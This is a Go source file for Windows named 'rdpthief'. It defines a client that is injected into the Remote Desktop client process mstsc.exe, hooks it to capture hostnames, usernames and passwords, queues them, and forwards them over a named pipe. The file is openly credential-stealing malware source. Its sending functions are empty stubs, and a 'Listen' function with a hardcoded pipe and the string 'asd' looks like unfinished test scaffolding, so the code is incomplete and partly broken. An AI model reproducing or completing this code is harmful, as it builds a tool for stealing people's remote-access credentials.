// +build windows

package rdpthief

import (
	"context"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"

	"project/internal/random"
)

// Credential is the credential that stolen from mstsc.exe.
type Credential struct {
	Hostname string
	Username string
	Password string
}

// Client will be injected to the mstsc process, if get new credential,
// it will connect to the server by named pipe, and send it.
type Client struct {
	pipeName string
	password []byte

	credQueue chan *Credential
	rand      *random.Rand
	hook      *Hook

	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup
}

// NewClient is used to create a rdpthief client.
func NewClient(pipeName, password string) *Client {
	client := Client{
		pipeName:  pipeName,
		password:  []byte(password),
		credQueue: make(chan *Credential, 1024),
		rand:      random.NewRand(),
	}
	client.hook = NewHook(client.recordCredential)
	client.ctx, client.cancel = context.WithCancel(context.Background())
	client.wg.Add(1)
	go client.sendLoop()
	return &client
}

func (client *Client) recordCredential(cred *Credential) {
	select {
	case client.credQueue <- cred:
	case <-client.ctx.Done():
	}
}

func (client *Client) sendLoop() {
	defer client.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			client.sendPanic(r)
		}
	}()
	for {
		select {
		case cred := <-client.credQueue:
			client.sendCred(cred)
		case <-client.ctx.Done():
			return
		}
	}
}

func (client *Client) sendCred(cred *Credential) {

}

func (client *Client) sendPanic(r interface{}) {

}

func (client *Client) send(msg interface{}) {

	ctx, cancel := context.WithTimeout(client.ctx, 10*time.Second)
	defer cancel()

	winio.DialPipeContext(ctx, `\\.\pipe\`)

}

func (client *Client) Close() error {
	client.cancel()
	client.wg.Wait()
	err := client.hook.Uninstall()
	if err != nil {
		return err
	}
	client.hook.Clean()
	return nil
}

func Listen() {
	listener, _ := winio.ListenPipe(`\\.\pipe\test`, nil)

	go func() {
		listener.Accept()
	}()

	conn, _ := winio.DialPipe(`\\.\pipe\test`, nil)
	conn.Write([]byte("asd"))

	time.Sleep(time.Minute)

	conn.Close()
}
